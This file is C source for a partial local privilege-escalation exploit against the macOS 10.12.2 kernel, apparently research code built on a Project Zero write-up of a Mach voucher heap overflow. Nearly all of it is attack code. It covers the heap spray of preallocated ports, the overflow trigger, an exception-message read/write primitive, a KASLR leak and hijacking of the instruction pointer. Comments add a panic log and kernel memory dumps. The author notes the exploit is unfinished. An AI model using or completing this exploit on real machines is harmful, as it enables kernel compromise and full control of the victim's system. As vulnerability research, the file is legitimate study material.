/*
 * $ sw_vers
 * ProductName:    Mac OS X
 * ProductVersion: 10.12.2
 * BuildVersion:   16C68

References:
 - https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=260804
 - https://googleprojectzero.blogspot.com/2017/04/exception-oriented-exploitation-on-ios.html

- SDK from: Command Line Tools (macOS 10.12) for Xcode 8.dmg (albeit Xcode 7.2 installed)

I control the rip, but because the there was no userclient which fit to kalloc.4096, 
I was not able to leak the correct vtable to finish the exploit.

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

#include <mach/mach.h>      // mach_port_allocate, mach_port_insert_right
#include <mach/mach_vm.h>   // mach_vm_read_overwrite
#include <mach-o/loader.h>  // MH_MAGIC_64
#include <mach/exc.h>       // __RequestUnion__exc_subsystem, __ReplyUnion__exc_subsystem

#include <sys/mman.h>       // PROT_READ, PROT_WRITE, MAP_PRIVAT, MAP_ANON
#include <assert.h>         // assert

#include <atm/atm_types.h>  // MACH_VOUCHER_ATTR_ATM_CREATE

#include "helper.h"
#include "librop.h"
#include "offsets.h"

#define kr32(address, value) \
    *(uint64_t*) (fake_task + 0x380) = address - 0x10; \
    pid_for_task(found_port, value);


typedef struct
{
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t desc[1];
    char pad[4096];
} oolmsg_t;

struct ipc_object
{
    natural_t io_bits;
    natural_t io_references;
    char      io_lock_data[0x100];
};

mach_port_t mport = 0;
mach_port_t tfp0 = 0;

void copyin(void *to, uint64_t from, size_t size)
{
    mach_vm_size_t outsize = size;
    size_t szt = size;
    if (size > 0x1000)
    {
        size = 0x1000;
    }
    size_t off = 0;
    while (1)
    {
        mach_vm_read_overwrite(tfp0, off + from, size, (mach_vm_offset_t)(off + to), &outsize);
        szt -= size;
        off += size;
        if (szt == 0)
        {
            break;
        }
        size = szt;
        if (size > 0x1000)
        {
            size = 0x1000;
        }
    }
}

void copyout(uint64_t to, void *from, size_t size)
{
    mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
}

uint64_t ReadAnywhere64(uint64_t addr)
{
    uint64_t val = 0;
    copyin(&val, addr, 8);
    return val;
}

uint64_t WriteAnywhere64(uint64_t addr, uint64_t val)
{
    copyout(addr, &val, 8);
    return val;
}

uint32_t ReadAnywhere32(uint64_t addr)
{
    uint32_t val = 0;
    copyin(&val, addr, 4);
    return val;
}

uint64_t WriteAnywhere32(uint64_t addr, uint32_t val)
{
    copyout(addr, &val, 4);
    return val;
}

/* See tools/tests/darwintests/voucher_traps.c */
mach_port_t get_voucher()
{
    mach_voucher_attr_recipe_data_t r =
    {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = MACH_VOUCHER_ATTR_ATM_CREATE
    };
    mach_port_t p = MACH_PORT_NULL;
    kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&r, sizeof(r), &p);

    EXIT_ON_MACH_ERROR("Failed to create voucher", err);
    LOG("[i] Got voucher: %x\n", p);
    return p;
}


void do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t *overflow_data)
{
    void *start_memory = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
    void *guard_memory = mmap(start_memory + PAGE_SIZE, PAGE_SIZE, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0);

    LOG("[i] start page: %p\n", start_memory);
    LOG("[i] guard page: %p\n", guard_memory); /* Because we have only one page, not really needed */

    memset(start_memory, 0xcc, PAGE_SIZE);
    *(uint64_t *)start_memory = kalloc_size;
    uint8_t *recipe = (uint8_t *)start_memory + PAGE_SIZE - kalloc_size - overflow_length;

    LOG("[i] recipe address: %p\n", recipe);
    memcpy(recipe + kalloc_size, (uint8_t *) overflow_data, overflow_length);

    mport = get_voucher();
    kern_return_t err = mach_voucher_extract_attr_recipe_trap( mport, 1, recipe, start_memory );
}

mach_port_t prealloc_port(uint32_t size)
{
    kern_return_t kr;
    mach_port_qos_t qos = {0};
    qos.prealloc = 1;
    qos.len = size;

    mach_port_name_t name = MACH_PORT_NULL;
    kr = mach_port_allocate_full(mach_task_self(), 
                                 MACH_PORT_RIGHT_RECEIVE,
                                 MACH_PORT_NULL,
                                 &qos,
                                 &name);

    EXIT_ON_MACH_ERROR("mach_port_allocate_full", kr);

    return (mach_port_t) name;
}

mach_port_t prealloc_port_debug(mach_port_t tfp0, uint64_t proc, uint32_t size) {
    mach_port_name_t name = prealloc_port(size);

    uint64_t port_addr = proc_port_name_to_port_address(tfp0, proc, name);
    uint64_t prealloc_buf;

    kread(tfp0, port_addr + struct_ipc_port_ipc_kmsg_offset, (vm_offset_t) &prealloc_buf, sizeof(prealloc_buf));

    LOG("[0x%016llx] => ipc_kmsg\n", prealloc_buf);

    return name;
}


io_iterator_t
iterator_4096_alloc() {
    io_iterator_t iterator;
    kern_return_t kr = 0;
    kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
                                      IOServiceMatching("IOService"),
                                      &iterator);
    EXIT_ON_MACH_ERROR("IOServiceGetMatchingServices", kr);

    return iterator;
}

/* START -- EXCEPTION RELATED CODE */ 
kern_return_t 
catch_exception_raise
(
    mach_port_t exception_port,
    mach_port_t thread,
    mach_port_t task,
    exception_type_t exception,
    exception_data_t code,
    mach_msg_type_number_t codeCnt
)
{
    // shouldn't reach
    //LOG("catch_exception_raise\n");
    return KERN_FAILURE;
}

uint8_t *crash_stack = NULL;

// Each time we get an exception message copy the first 16 registers into this buffer
uint64_t crash_buf[32] = {0};

kern_return_t
catch_exception_raise_state
(
    mach_port_t exception_port,
    exception_type_t exception,
    const exception_data_t code,
    mach_msg_type_number_t codeCnt,
    int *flavor,
    const thread_state_t old_state,
    mach_msg_type_number_t old_stateCnt,
    thread_state_t new_state,
    mach_msg_type_number_t *new_stateCnt
)
{
    LOG("catch_exception_raise_state\n");
    memcpy(crash_buf, old_state, sizeof(crash_buf));

    // Make the thread exit:
    memset(new_state, 0, sizeof(_STRUCT_X86_THREAD_STATE64));
    _STRUCT_X86_THREAD_STATE64 *new = (_STRUCT_X86_THREAD_STATE64 *)(new_state);

    // It needs a minimal stack:
    if (!crash_stack)
    {
        crash_stack = malloc(0x4000);
        crash_stack += 0x3ff0;
    }

    *new_stateCnt = old_stateCnt;

    new->__rip = (uint64_t)pthread_exit;
    // new->__rax = 0;
    new->__rsp = (uint64_t)crash_stack;

    return KERN_SUCCESS;
}

kern_return_t 
catch_exception_raise_state_identity
(
    mach_port_t exception_port,
    mach_port_t thread,
    mach_port_t task,
    exception_type_t exception,
    exception_data_t code,
    mach_msg_type_number_t codeCnt,
    int *flavor,
    thread_state_t old_state,
    mach_msg_type_number_t old_stateCnt,
    thread_state_t new_state,
    mach_msg_type_number_t *new_stateCnt
)
{
    // Shouldn't reach
    //LOG("catch_exception_raise_state_identity\n");
    return KERN_FAILURE;
}

union max_msg
{
    union __RequestUnion__exc_subsystem requests;
    union __ReplyUnion__exc_subsystem replies;
};

extern boolean_t exc_server(mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP);

// (Actually only 15 controlled qwords for the send)
struct thread_args
{
    uint64_t buf[32];
    mach_port_t exception_port;
};

void *do_thread(void *arg)
{
    struct thread_args *args = (struct thread_args *)arg;
    uint64_t buf[32];
    memcpy(buf, args->buf, sizeof(buf));

    kern_return_t kr;
    kr = thread_set_exception_ports(
              mach_thread_self(),
              EXC_MASK_ALL,
              args->exception_port,
              EXCEPTION_STATE, // we want to receive a catch_exception_raise_state message
              x86_THREAD_STATE64);
    free(args);
    EXIT_ON_MACH_ERROR("thread_set_exception_ports", kr);

    LOG("[i] exception_ports installed\n")

/* https://github.com/opensource-apple/cctools/blob/master/include/mach/i386/_structs.h */
    register uint64_t *buf_ptr asm("r15") = buf; /* without this, rdi will be used */
    __asm__ __volatile__ ( /* Assembly function body */
        "movq   0x0(%0), %%rax      \n"
        "movq   0x8(%0), %%rbx      \n"
        "movq  0x10(%0), %%rcx      \n"
        "movq  0x18(%0), %%rdx      \n"
        "movq  0x20(%0), %%rdi      \n"
        "movq  0x28(%0), %%rsi      \n"
        "movq  0x30(%0), %%rbp      \n"
        "movq  0x38(%0), %%rsp      \n"
        "movq  0x40(%0), %%r8       \n"
        "movq  0x48(%0), %%r9       \n"
        "movq  0x50(%0), %%r10      \n"
        "movq  0x58(%0), %%r11      \n"
        "movq  0x60(%0), %%r12      \n"
        "movq  0x68(%0), %%r13      \n"
        "movq  0x70(%0), %%r14      \n"
        "movq  0x78(%0), %%r15      \n"
        "int3                      \n" 
        :          /* outputs */
        : "r"(buf_ptr) /* inputs */
    );
    LOG("no crashy?");
    return NULL;
}
/* END -- EXCEPTION RELATED CODE */ 


void prepare_prealloc_port(mach_port_t port)
{
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
}

int port_has_message(mach_port_t port)
{
    kern_return_t kr;
    mach_port_seqno_t msg_seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    mach_msg_trailer_t msg_trailer; // NULL trailer
    mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
    kr = mach_port_peek(mach_task_self(),
                        port,
                        MACH_RCV_TRAILER_NULL,
                        &msg_seqno,
                        &msg_size,
                        &msg_id,
                        (mach_msg_trailer_info_t)&msg_trailer,
                        &msg_trailer_size);

    return (kr == KERN_SUCCESS);
}

// Port needs to have a send right
void send_prealloc_msg(mach_port_t port, uint64_t *buf, int n)
{
    struct thread_args *args = malloc(sizeof(struct thread_args));
    memset(args, 0, sizeof(struct thread_args));
    memcpy(args->buf, buf, n * 8);

    args->exception_port = port;

    // Start a new thread passing it the buffer and the exception port
    pthread_t t;
    pthread_create(&t, NULL, do_thread, (void *)args);

    // Associate the pthread_t with the port so that we can join the correct pthread
    // When we receive the exception message and it exits:
    kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t) t);
    LOG("[i] Set context\n");
    // Wait until the message has actually been sent:
    
    while (!port_has_message(port)) {;}
    
    LOG("[i] Message was sent\n");
}

// The returned pointer is only valid until the next call to this function
// Ownership is retained by this function
uint64_t *receive_prealloc_msg(mach_port_t port)
{
    LOG("[i] MARKER1\n");
    kern_return_t err = mach_msg_server_once(exc_server,
                        sizeof(union max_msg),
                        port,
                        MACH_MSG_TIMEOUT_NONE);
    LOG("[i] MARKER2\n");

    LOG("receive_prealloc_msg: %s\n", mach_error_string(err));

    // Get the pthread context back from the port and join it:
    pthread_t t;
    err = mach_port_get_context(mach_task_self(), port, (mach_port_context_t *)&t);
    pthread_join(t, NULL);

    return &crash_buf[0];
}


int main(int argc, char **argv, char **envp)
{
    int debug = 1;

    initialize_macos_10_12_2_16C68_offsets();

    kernel_map_t *km = map_file("/System/Library/Kernels/kernel");
    uint64_t kernel_base_without_slide = find_symbol_address(km, "__mh_execute_header");
    
    uint32_t prealloc_size = 0x900; // To fit inside kalloc.4096 with header

    for (int i = 0; i < 20000; i++) {
        prealloc_port(prealloc_size);
    }

    mach_port_t holder;
    mach_port_t first_port;
    mach_port_t second_port;

    uint64_t kslide;
    uint64_t allproc;
    uint64_t our_proc;

    // These will be contiguous now, convienient!
    if (debug) {
        obtain_tfp0(&tfp0);
        kslide = 0xfc00000;
        allproc = find_symbol_address(km, "_allproc") + kslide;
        our_proc = find_proc_address(tfp0, allproc, getpid());

        holder = prealloc_port_debug(tfp0, our_proc, prealloc_size);
        first_port = prealloc_port_debug(tfp0, our_proc, prealloc_size);
        second_port = prealloc_port_debug(tfp0, our_proc, prealloc_size);
    } else {
        holder = prealloc_port(prealloc_size);
        first_port = prealloc_port(prealloc_size);
        second_port = prealloc_port(prealloc_size);
    }

    // Free the holder:
    mach_port_destroy(mach_task_self(), holder);

    // Reallocate the holder and overflow out of it
    uint64_t overflow_bytes[] = {0x1104-0x68};
    // uint64_t overflow_bytes[] = {0x10dc, 0, 0, 0, 0, 0, 0, 0};
    do_overflow(0x1000, 8, (uint8_t *) overflow_bytes);

    // Grab the holder again
    if (debug) {
        holder = prealloc_port_debug(tfp0, our_proc, prealloc_size);
    } else {
        holder = prealloc_port(prealloc_size);
    }

    // Insert the send rights from our task
    prepare_prealloc_port(first_port);
    prepare_prealloc_port(second_port);

    // Send a message to the first port; overwriting the header of the second prealloced message
    // with a legitimate header:
    uint64_t valid_header[] = {0xc40, 0, 0, 0, 0, 0, 0, 0};
    // uint64_t valid_header[] = {0x1111111111, 0x1111111112, 0x1111111113, 0x1111111114, 0x1111111115, 0x1111111116, 0x1111111117, 0x1111111118};
    send_prealloc_msg(first_port, valid_header, 8);

    // Send a message to the second port; writing a pointer to itself in the prealloc buffer
    send_prealloc_msg(second_port, valid_header, 8);

    // Receive on the first port, reading the header of the second:
    uint64_t *buf = receive_prealloc_msg(first_port);

    for (int i = 0; i < 8; i++) {
        LOG("[0x%llx]\n", buf[i]);
    }

    uint64_t kernel_buffer_base = buf[1];

    // Receive the message on second
    receive_prealloc_msg(second_port);

    // Send another message on first, writing a valid, safe header back over second
    send_prealloc_msg(first_port, valid_header, 8);

    // Free second and get it reallocated as a Iterator:
    mach_port_deallocate(mach_task_self(), second_port);
    mach_port_destroy(mach_task_self(), second_port);

    io_iterator_t iter = iterator_4096_alloc();

    // Read back
    buf = receive_prealloc_msg(first_port);
    LOG("[i] Received:\n");
    for (int i = 0; i < 8 ; i++) {
        LOG("0x%llx\n", buf[i]);
    }

    // Save a copy of the original object:
    uint64_t legit_object[32];
    memcpy(legit_object, buf, sizeof(legit_object));

    // This is not reliable!
    uint64_t leak = buf[0];
    kslide = (leak - 0xffffff800687d0e0) & ~0x1fffff;
    LOG("[+] KASLR slide: %#016llx\n", kslide);

    uint64_t kernel_base = kernel_base_without_slide + kslide;
    LOG("[+] kernel_base: %#016llx\n", kernel_base);

/*
*** Panic Report ***
panic(cpu 0 caller 0xffffff8010005ead): Kernel trap at 0x0000003133731332, type 14=page fault, registers:
CR0: 0x0000000080010033, CR2: 0x0000003133731332, CR3: 0x0000000035348087, CR4: 0x00000000001606e0
RAX: 0xffffff8020fa7fe8, RBX: 0x00000000e00002c2, RCX: 0x0000000001000000, RDX: 0xffffff8016542d70
RSP: 0xffffff887072bd98, RBP: 0xffffff887072bdd0, RSI: 0x0000000000000000, RDI: 0xffffff8020fa8078
R8:  0xffffff801066a2e0, R9:  0x0000000000000000, R10: 0x000000000000eab1, R11: 0x0000000000000000
R12: 0xffffff8020fa8078, R13: 0x0000000000000000, R14: 0xffffff80164a19e0, R15: 0xffffff801beda488
RFL: 0x0000000000010286, RIP: 0x0000003133731332, CS:  0x0000000000000008, SS:  0x0000000000000010
Fault CR2: 0x0000003133731332, Error code: 0x0000000000000010, Fault CPU: 0x0 VMM, PL: 0, VF: 1
*/
    uint64_t payload[] = {kernel_buffer_base+0x8*15, // JMP to the end
        0x3133731332, // SLIDE_PTR(_thread_exception_return),
        0x3133731333, 
        0x3133731334, 
        0x3133731335, 
        0x3133731336, 
        0x3133731337, 
        0x3133731338,
        0x3133731339,
        0x3133731340,
        0x3133731341,
        0x3133731342,
        0x3133731343,
        0x3133731344,
        0x3133731345,
        kernel_buffer_base+0x8*1 - 32, // Trampoline back to the first entry
                                       // call    qword ptr [rax+32]
    };
    send_prealloc_msg(first_port, payload, 16);

    buf = receive_prealloc_msg(first_port);
    LOG("[i] Received:\n");
    for (int i = 0; i < 16; i++) {
        LOG("0x%llx\n", buf[i]);
    }

    IOIteratorNext(iter);

    // IOObjectRelease(iter);
    /* we control rdi vtable (idx 0)
    __text:FFFFFF801043950A                 mov     rax, [rdi]
    __text:FFFFFF801043950D                 mov     rsi, r14
    __text:FFFFFF8010439510                 call    qword ptr [rax+50h]
    */
    sleep(10000);
}


/*
struct ipc_kmsg {
  mach_msg_size_t            ikm_size;
  struct ipc_kmsg            *ikm_next;
  struct ipc_kmsg            *ikm_prev;
  mach_msg_header_t          *ikm_header;
  ipc_port_t                 ikm_prealloc;
  ipc_port_t                 ikm_voucher;
  mach_msg_priority_t        ikm_qos;
  mach_msg_priority_t        ikm_qos_override
  struct ipc_importance_elem *ikm_importance;
  queue_chain_t              ikm_inheritance;
};
*/

// osfmk/ipc/ipc_kmsg.h
// #define ikm_init(kmsg, size)                                    \
// MACRO_BEGIN                                                     \
//     (kmsg)->ikm_size = (size);                                  \
//     (kmsg)->ikm_prealloc = IP_NULL;                             \
//     (kmsg)->ikm_voucher = IP_NULL;                              \
//     (kmsg)->ikm_importance = IIE_NULL;                          \
//     (kmsg)->ikm_qos = MACH_MSG_PRIORITY_UNSPECIFIED;            \
//     (kmsg)->ikm_qos_override = MACH_MSG_PRIORITY_UNSPECIFIED;   \
//     ikm_flipc_init(kmsg);                                       \
//     assert((kmsg)->ikm_prev = (kmsg)->ikm_next = IKM_BOGUS);    \
// MACRO_END

// #define ikm_set_header(kmsg, mtsize)                    \
// MACRO_BEGIN                             \
//     (kmsg)->ikm_header = (mach_msg_header_t *)          \
//     ((vm_offset_t) ((kmsg) + 1) + (kmsg)->ikm_size - (mtsize));  \
// MACRO_END

// *((_QWORD *)v16 + 3) = (char *)v16 + max_expanded_size - msg_and_trailer_size + 0x50;// ikm_header


/*
Before overflow:

$ sudo kernutil/kernutil-x64 -m read -a 0xffffff8020fc1000 -c 1 -w4444448
[0xffffff8020fc1000]: 0x00000c40
[0xffffff8020fc1004]: 0xdeadbeef
[0xffffff8020fc1008]: 0x1f605a80
[0xffffff8020fc100c]: 0xffffff80
[0xffffff8020fc1010]: 0x03020000
[0xffffff8020fc1014]: 0x00000000
[0xffffff8020fc1018]: 0xffffff8020fc1344

$ sudo kernutil/kernutil-x64 -m read -a 0xffffff8020fc2000 -c 1 -w4444448
[0xffffff8020fc2000]: 0x00000c40
[0xffffff8020fc2004]: 0xdeadbeef
[0xffffff8020fc2008]: 0x1f3f1888
[0xffffff8020fc200c]: 0xffffff80
[0xffffff8020fc2010]: 0x03020000
[0xffffff8020fc2014]: 0x00000000
[0xffffff8020fc2018]: 0xffffff8020fc2344

$ sudo kernutil/kernutil-x64 -m read -a 0xffffff8020fc3000 -c 1 -w4444448
[0xffffff8020fc3000]: 0x00000c40
[0xffffff8020fc3004]: 0xdeadbeef
[0xffffff8020fc3008]: 0x03020000
[0xffffff8020fc300c]: 0x00000000
[0xffffff8020fc3010]: 0x00000000
[0xffffff8020fc3014]: 0x00000000
[0xffffff8020fc3018]: 0xffffff8020fc3344

After overflow, first_port:

$ sudo kernutil/kernutil-x64 -m read -a 0xffffff8020fa6000 -c 1 -w4444448
[0xffffff8020fa6000]: 0x00001104
[0xffffff8020fa6004]: 0x00000000
[0xffffff8020fa6008]: 0x00000000
[0xffffff8020fa600c]: 0x00000000
[0xffffff8020fa6010]: 0x00000000
[0xffffff8020fa6014]: 0x00000000
[0xffffff8020fa6018]: 0x0000000000000000
*/